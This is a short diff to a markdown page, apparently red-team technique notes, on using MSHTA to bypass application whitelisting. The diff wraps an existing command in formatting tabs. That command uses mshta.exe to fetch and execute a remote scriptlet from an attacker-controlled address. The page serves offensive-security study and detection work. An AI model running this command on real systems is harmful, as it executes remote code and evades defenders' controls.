@@ -31,10 +31,14 @@ description: MSHTA code execution - bypass application whitelisting.
 
 ## Execution
 
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
 ```bash
 # from powershell
 /cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ## Observations
 
